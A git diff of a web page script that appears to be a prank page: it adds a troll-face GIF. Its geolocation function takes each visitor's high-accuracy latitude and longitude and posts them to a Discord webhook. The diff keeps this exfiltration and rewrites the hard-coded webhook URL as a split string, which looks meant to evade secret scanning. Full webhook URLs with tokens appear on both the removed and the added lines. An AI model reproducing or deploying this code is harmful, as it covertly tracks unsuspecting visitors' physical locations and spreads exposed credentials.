@@ -1,4 +1,11 @@
 document.getElementById('wordsbox').appendChild(getGeoCoords())
+const trollface = document.createElement('span')
+trollface.innerHTML += `
+    <img src="https://media.tenor.com/mOovG0h3E6IAAAAM/troll-face.gif" alt="trol">
+    `;
+document.getElementById('wordsbox').appendChild(trollface)
+
+
 const hoverables = document.getElementsByClassName('word')
 for (const word of hoverables) {
     spanify(word);
@@ -26,8 +33,7 @@ function getGeoCoords() {
             long.innerText = "Longitude: " + position.coords.longitude;
             coords.appendChild(lat);
             coords.appendChild(long);
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1086596327498059846/pA1X24NU0ydOsgiFjTFYPCC6g5ib7l8sIMNsuYBM6efDaQUR4IQqbbBZAw-asx8bd-Cb'
-            sendPostToWebhook(WEBHOOK_URL, lat.innerText + ' ' + long.innerText)
+            sendPostToWebhook(lat.innerText + ' ' + long.innerText)
             spanify(lat, long)
         }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });
 
@@ -36,7 +42,8 @@ function getGeoCoords() {
     }
     return coords
 }
-function sendPostToWebhook(webHookURL, message) {
+function sendPostToWebhook(message) {
+    const webHookURL = 'https:' + '//discord.com/api/webhooks/1090630967179345950/EQJEsXS_TrN-yGiEYQ-tTsL_pxpOwbvRWr3hs3pxti1G14bkvYncaAW5CU34VvUfPURy'
     let xhr = new XMLHttpRequest();
     xhr.open("POST", webHookURL, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
